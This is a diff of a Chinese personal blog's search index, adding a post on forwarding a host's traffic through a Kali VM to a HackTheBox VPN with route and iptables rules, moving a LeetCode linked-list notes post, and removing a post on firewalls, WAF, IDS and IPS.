@@ -422,6 +422,64 @@
       </tags>
   </entry>
   <entry>
+    <title>路由转发实操</title>
+    <url>/2024/02/16/lyzfsc/</url>
+    <content><![CDATA[<h1 id="0x01-实操原因"><a href="#0x01-实操原因" class="headerlink" title="0x01 实操原因"></a>0x01 实操原因</h1><p>玩htb的时候，kali实在不能再多进程啦，开个bp都卡死，之前我不是想着由物理机去开burpsuite，解放kali嘛，但是失败了，当时burp是抓到了虚拟机里访问目标web的包，但是它作为一个代理，源ip(burp)与目的ip(htb)不在同网段，遗憾放弃；但现在不一样了，我是真的花时间去想这个东西，还真让我找到了</p>
+<h1 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h1><p>三个机子，主机为A，虚拟机kali为B，hackthebox为C</p>
+<p>我可以直接给物理机下一个openvpn，但我懒</p>
+<p>已知B通过openvpn能访问C；而我A和B属于另一网段，可互相访问；现在B容易卡死，因为主机太垃圾，虚拟机空间不够，所以我想尝试A通过B访问C，这种思路分析一下，那就是个代理技术，B作为代理服务器，感觉有搞头嘞</p>
+<p>但是貌似有更直接的方法，即<strong>路由转发</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">window下：</span><br><span class="line">route add 10.0.0.0 mask 255.0.0.0 192.168.241.3 <span class="comment">#流向C的流量，发往kali</span></span><br><span class="line"><span class="comment">#其实是下面这种</span></span><br><span class="line"><span class="comment">#第一条规则告诉主机A，当它试图访问 10.10.11.249 时，数据包应该通过路由到 10.10.16.9(B使用openvpn时分配的ip)。</span></span><br><span class="line">route add 10.10.16.9 mask 255.255.255.255 192.168.241.3(B的ip)</span><br><span class="line"><span class="comment">#第二条规则告诉主机A，当它试图访问 10.10.16.9 时，数据包应该通过路由到 192.168.241.3。</span></span><br><span class="line">route add 10.10.11.249 mask 255.255.255.255 10.10.16.9</span><br><span class="line"></span><br><span class="line">kali下：</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">iptables -t nat -A POSTROUTING -o &lt;OpenVPN接口&gt; -j MASQUERADE <span class="comment">#接口比如tun0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面这几个缺一不可</span></span><br><span class="line"><span class="comment">#将从物理机A到虚拟机B (Kali) 的流量的源IP地址修改为虚拟机B (Kali) 的IP地址，并且确保相关的转发规则</span></span><br><span class="line">iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE</span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span></span><br><span class="line">iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables -t nat -L -n -v #查看配置的</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><p><code>-t nat</code>: 指定规则表为 “nat” 表，即网络地址转换表。</p>
+</li>
+<li><p><code>-A POSTROUTING</code>: 在 “nat” 表的 POSTROUTING 链中追加规则，即对于从本地网络流出的数据包进行处理。</p>
+</li>
+<li><p><code>-o tun0</code>: 指定出口接口为 <code>tun0</code>，即数据包将通过这个接口离开本地网络。</p>
+</li>
+<li><p><code>-j MASQUERADE</code>: 使用 <code>MASQUERADE</code> 目标，将数据包的源地址替换为本地网络接口的地址，使其看起来像是从主机直接流出的</p>
+<p>为通过 <code>tun0</code> 接口流出的数据包进行地址伪装，使得它们看起来像是直接从主机发出的。这通常用于隐藏内部网络结构</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-A FORWARD: 在 “filter” 表的 FORWARD 链中追加规则，即用于处理转发的数据包</p>
+<p>-i tun0 -o eth0: 数据包从 tun0 接口进入，经过 eth0 接口流出。</p>
+<p>-m state –state RELATED,ESTABLISHED: 匹配已建立连接或与已建立连接相关的数据包。</p>
+<p>-j ACCEPT: 允许匹配的数据包通过</p>
+<p>#↑允许已建立连接或相关的数据包在 tun0 和 eth0 之间进行转发</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>-A FORWARD</code>: 在 “filter” 表的 FORWARD 链中追加规则。</li>
+<li><code>-i eth0 -o tun0</code>: 数据包从 <code>eth0</code> 接口进入，经过 <code>tun0</code> 接口流出。</li>
+<li><code>-j ACCEPT</code>: 允许所有匹配的数据包通过。</li>
+</ul>
+<p>这条规则的作用是允许所有从 <code>eth0</code> 到 <code>tun0</code> 的数据包进行转发。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240216171240079.png" alt="物理机ping成功"></p>
+<p>可行，这种方式解决了虚拟机内存不够的问题，进程多了容易卡死，这个应该就可以用我物理机的burp去抓包了</p>
+<p>总结一下，windows机去添加两条路由，告诉数据包应该怎么走；kali做ip转发，以及源ip转换</p>
+<p>参考来源：<strong>chatgpt 3.5</strong> (啧，折腾好久)</p>
+]]></content>
+      <categories>
+        <category>路由转发</category>
+      </categories>
+      <tags>
+        <tag>流量转发</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内网场景搭建</title>
     <url>/2024/02/02/%E6%90%AD%E5%BB%BA-ssrf/</url>
     <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>为了更好地熟悉ssrf</p>
@@ -4985,7 +5043,7 @@
 <p>f12扫一眼它的源代码，还有js</p>
 <p>看它的网页功能，主要关注有搜索框和登录入口</p>
 <p>登录可以创建账户，先创建一个</p>
-<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#x31;&#x32;&#x33;&#x34;&#x35;&#54;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x31;&#x32;&#x33;&#x34;&#x35;&#54;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>被用过</p>
+<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#49;&#50;&#51;&#52;&#x35;&#x36;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;">&#49;&#50;&#51;&#52;&#x35;&#x36;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;</a>被用过</p>
 <p>test123qwe，进入，有填写基本信息，有上传图片功能</p>
 <p>有一个报错</p>
 <p><img src="/../../../Typora/img111/image-20231117111539091.png"></p>
@@ -10270,6 +10328,56 @@
       </tags>
   </entry>
   <entry>
+    <title>链表</title>
+    <url>/2023/07/02/%E9%93%BE%E8%A1%A8/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义一个结点模板</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">struct Node &#123;</span><br><span class="line">	T data;</span><br><span class="line">	Node *next;</span><br><span class="line">	Node() : next(nullptr) &#123;&#125;</span><br><span class="line">	Node(const T &amp;d) : data(d), next(nullptr) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//删除 p 结点后面的元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Remove(Node&lt;T&gt; *p) &#123;</span><br><span class="line">	if (p == nullptr || p-&gt;next == nullptr) &#123;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	auto tmp = p-&gt;next-&gt;next;</span><br><span class="line">	delete p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//在 p 结点后面插入元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Insert(Node&lt;T&gt; *p, const T &amp;data) &#123;</span><br><span class="line">	auto tmp = new Node&lt;T&gt;(data);</span><br><span class="line">	tmp-&gt;next = p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//遍历链表</span><br><span class="line">template&lt;typename T, typename V&gt;</span><br><span class="line">void Walk(Node&lt;T&gt; *p, const V &amp;vistor) &#123;</span><br><span class="line">	while(p != nullptr) &#123;</span><br><span class="line">		vistor(p);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	auto p = new Node&lt;int&gt;(1);</span><br><span class="line">	Insert(p, 2);</span><br><span class="line">	int sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	Remove(p);</span><br><span class="line">	sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：自在飞花</span><br><span class="line">链接：https://leetcode.cn/problems/linked-list-cycle/solutions/175734/yi-wen-gao-ding-chang-jian-de-lian-biao-wen-ti-h-2/</span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="1-环形链表"><a href="#1-环形链表" class="headerlink" title="1.环形链表"></a>1.环形链表</h1><p>给你一个链表的头节点 <code>head</code> ，判断链表中是否有环。</p>
+<p>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。<strong>注意：<code>pos</code> 不作为参数进行传递</strong> 。仅仅是为了标识链表的实际情况。</p>
+<p><em>如果链表中存在环</em> ，则返回 <code>true</code> 。 否则，返回 <code>false</code> 。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [3,2,0,-4], pos = 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>
+
+<h2 id="法1（哈希表）"><a href="#法1（哈希表）" class="headerlink" title="法1（哈希表）"></a>法1（哈希表）</h2><p>哈希表加遍历：每次遍历时，通过哈希表查看该指针是否访问过</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        set&lt;ListNode*&gt; st;</span><br><span class="line">        ListNode* p1=head;</span><br><span class="line">        <span class="keyword">while</span>(p1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(st.<span class="built_in">count</span>(p1)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                st.<span class="built_in">insert</span>(p1);</span><br><span class="line">            &#125;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>O(n)</p>
+<p>O(n)</p>
+</blockquote>
+<h2 id="法2（快慢指针）"><a href="#法2（快慢指针）" class="headerlink" title="法2（快慢指针）"></a>法2（快慢指针）</h2><p>这个代码不对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool hasCycle(ListNode *head) &#123;</span><br><span class="line">        if(head==nullptr) return false; //没有元素</span><br><span class="line">        else if(head-&gt;next==nullptr) return false; //有1个元素</span><br><span class="line">        else if(head-&gt;next-&gt;next=head) return true;//有两个元素</span><br><span class="line"></span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next-&gt;next;</span><br><span class="line">        while(p1&amp;&amp;p2)</span><br><span class="line">        &#123;</span><br><span class="line">            if(p1==p2-&gt;next) return true;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">            p2=p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[1,2]</p>
+<p>-1</p>
+<p>输出：true</p>
+<p>预期输出：false</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>||head-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(p1!=p2)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">if</span>(p2==<span class="literal">nullptr</span> || p2-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           p1=p1-&gt;next;</span><br><span class="line">           p2=p2-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>当链表中不存在环时，快指针将先于慢指针到达链表尾部，链表中每个节点至多被访问两次。</p>
+<p>当链表中存在环时，每一轮移动后，快慢指针的距离将减小一。而初始距离为环的长度，因此至多移动 N 轮。</p>
+<blockquote>
+<p>O(n)</p>
+<p>O(1)</p>
+</blockquote>
+<h1 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h1><p>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。</p>
+<p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p>
+<p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure>
+
+<h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2>]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>链表</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>力扣</title>
     <url>/2023/07/02/%E5%8A%9B%E6%89%A3/</url>
     <content><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>vscode默认不支持c++11解决办法</p>
@@ -12416,56 +12524,6 @@
       </tags>
   </entry>
   <entry>
-    <title>链表</title>
-    <url>/2023/07/02/%E9%93%BE%E8%A1%A8/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义一个结点模板</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">struct Node &#123;</span><br><span class="line">	T data;</span><br><span class="line">	Node *next;</span><br><span class="line">	Node() : next(nullptr) &#123;&#125;</span><br><span class="line">	Node(const T &amp;d) : data(d), next(nullptr) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//删除 p 结点后面的元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Remove(Node&lt;T&gt; *p) &#123;</span><br><span class="line">	if (p == nullptr || p-&gt;next == nullptr) &#123;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	auto tmp = p-&gt;next-&gt;next;</span><br><span class="line">	delete p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//在 p 结点后面插入元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Insert(Node&lt;T&gt; *p, const T &amp;data) &#123;</span><br><span class="line">	auto tmp = new Node&lt;T&gt;(data);</span><br><span class="line">	tmp-&gt;next = p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//遍历链表</span><br><span class="line">template&lt;typename T, typename V&gt;</span><br><span class="line">void Walk(Node&lt;T&gt; *p, const V &amp;vistor) &#123;</span><br><span class="line">	while(p != nullptr) &#123;</span><br><span class="line">		vistor(p);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	auto p = new Node&lt;int&gt;(1);</span><br><span class="line">	Insert(p, 2);</span><br><span class="line">	int sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	Remove(p);</span><br><span class="line">	sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：自在飞花</span><br><span class="line">链接：https://leetcode.cn/problems/linked-list-cycle/solutions/175734/yi-wen-gao-ding-chang-jian-de-lian-biao-wen-ti-h-2/</span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="1-环形链表"><a href="#1-环形链表" class="headerlink" title="1.环形链表"></a>1.环形链表</h1><p>给你一个链表的头节点 <code>head</code> ，判断链表中是否有环。</p>
-<p>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。<strong>注意：<code>pos</code> 不作为参数进行传递</strong> 。仅仅是为了标识链表的实际情况。</p>
-<p><em>如果链表中存在环</em> ，则返回 <code>true</code> 。 否则，返回 <code>false</code> 。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [3,2,0,-4], pos = 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>
-
-<h2 id="法1（哈希表）"><a href="#法1（哈希表）" class="headerlink" title="法1（哈希表）"></a>法1（哈希表）</h2><p>哈希表加遍历：每次遍历时，通过哈希表查看该指针是否访问过</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        set&lt;ListNode*&gt; st;</span><br><span class="line">        ListNode* p1=head;</span><br><span class="line">        <span class="keyword">while</span>(p1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(st.<span class="built_in">count</span>(p1)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                st.<span class="built_in">insert</span>(p1);</span><br><span class="line">            &#125;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>O(n)</p>
-<p>O(n)</p>
-</blockquote>
-<h2 id="法2（快慢指针）"><a href="#法2（快慢指针）" class="headerlink" title="法2（快慢指针）"></a>法2（快慢指针）</h2><p>这个代码不对</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool hasCycle(ListNode *head) &#123;</span><br><span class="line">        if(head==nullptr) return false; //没有元素</span><br><span class="line">        else if(head-&gt;next==nullptr) return false; //有1个元素</span><br><span class="line">        else if(head-&gt;next-&gt;next=head) return true;//有两个元素</span><br><span class="line"></span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next-&gt;next;</span><br><span class="line">        while(p1&amp;&amp;p2)</span><br><span class="line">        &#123;</span><br><span class="line">            if(p1==p2-&gt;next) return true;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">            p2=p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>[1,2]</p>
-<p>-1</p>
-<p>输出：true</p>
-<p>预期输出：false</p>
-</blockquote>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>||head-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(p1!=p2)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">if</span>(p2==<span class="literal">nullptr</span> || p2-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           p1=p1-&gt;next;</span><br><span class="line">           p2=p2-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>当链表中不存在环时，快指针将先于慢指针到达链表尾部，链表中每个节点至多被访问两次。</p>
-<p>当链表中存在环时，每一轮移动后，快慢指针的距离将减小一。而初始距离为环的长度，因此至多移动 N 轮。</p>
-<blockquote>
-<p>O(n)</p>
-<p>O(1)</p>
-</blockquote>
-<h1 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h1><p>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。</p>
-<p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p>
-<p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure>
-
-<h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2>]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>链表</tag>
-        <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>chunqiu</title>
     <url>/2023/07/02/%E6%98%A5%E7%A7%8B/</url>
     <content><![CDATA[<p>学的难受，不实战的话，非常容易忘。</p>
@@ -12637,47 +12695,6 @@
       </tags>
   </entry>
   <entry>
-    <title>安全产品</title>
-    <url>/2023/07/01/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/</url>
-    <content><![CDATA[<p>作用，原理，部署位置</p>
-<h1 id="一、WF"><a href="#一、WF" class="headerlink" title="一、WF"></a>一、WF</h1><p>基础防火墙</p>
-<p>主要是可实现基本包过滤策略的防火墙，限制对IP:port的访问。</p>
-<p>基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。FW可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。</p>
-<p> FW部署位置一般为外联出口或者区域性出口位置，对内外流量进行安全隔离。</p>
-<p>公共网络&lt;-边界路由器与核心交换机之间-&gt;(用户工作区、服务器组群)</p>
-<h1 id="二、WAF"><a href="#二、WAF" class="headerlink" title="二、WAF"></a>二、WAF</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。</p>
-<p>流量识别、攻击检测、攻击响应、日志记录</p>
-<h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><strong>部署时要使WAF尽量靠近WEB服务器</strong>，对基于HTTP协议的通信进行检测和识别。通俗的说，WAF类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。</p>
-<p>sqlmap可以识别waf种类。</p>
-<p> 透明代理模式、反向代理模式、路由代理模式及端口镜像模式。</p>
-<p>前三种模式为线上，串行部署web服务器前端，检测并阻断异常流量。</p>
-<p>端口镜像模式将WAF旁路接在WEB服务器上游的交换机上，只用于检测异常流量。</p>
-<h1 id="三、IDS-被动"><a href="#三、IDS-被动" class="headerlink" title="三、IDS(被动)"></a>三、IDS(<strong>被动</strong>)</h1><p>IDS（入侵检测系统）就是依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性</p>
-<p><strong>特点是不阻断任何网络访问，主要以提供报告和事后监督为主</strong></p>
-<p><strong>以旁路为主</strong></p>
-<h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><p>实时监测、安全审计、主动响应</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.信息收集</p>
-<p>收集的内容包括系统、网络、数据及用户活动的状态和行为</p>
-<p>2.数据分析</p>
-<p>模式匹配：收集到的信息与已知的网络入侵和系统误用模式数据库进行比较，从而发现违背安全策略的行为</p>
-<p>统计分析：统计正常使用时的一些测量属性（如访问次数、操作失败 次数和延时等）。测量属性的平均值将被用来与网络、系统的行为进行比 较，任何观察值如果超过了正常值范围，就认为有入侵发生</p>
-<p>完整性分析：主要关注某个文件或对象是否被更改，这经常包括文件和 目录的内容及属性，它在发现被修改成类似特洛伊木马的应用程序方面特 别有效。</p>
-<h1 id="四、IPS（主动）"><a href="#四、IPS（主动）" class="headerlink" title="四、IPS（主动）"></a>四、IPS（主动）</h1><p> 解决了IDS无法阻断的问题，基本上以在线模式为主，系统提供多个端口，以透明模式工作。<strong>本质是增强入侵行为库，检测出后自动进行防御</strong>(主要为模式匹配)</p>
-<p>缺点在于<strong>不能主动的学习</strong>攻击方式，对于模式库中不能识别出来的攻击，默认策略是允许访问的。</p>
-<p><strong>常被串接在主干路上</strong></p>
-<h2 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h2><p>通过直接嵌入到网络流量中，利用一个网络端口接收外部流量，经过检查确认其中不包含异常活动或可疑内容，再通过另一个端口转发给内部系统（实际是对恶意流量进行清洗）。</p>
-<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>过滤器，能够防止各种攻击</p>
-]]></content>
-      <categories>
-        <category>安全产品</category>
-      </categories>
-      <tags>
-        <tag>WF</tag>
-        <tag>WAF</tag>
-        <tag>IPS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>实战记录</title>
     <url>/2023/07/01/%E5%AE%9E%E6%88%98/</url>
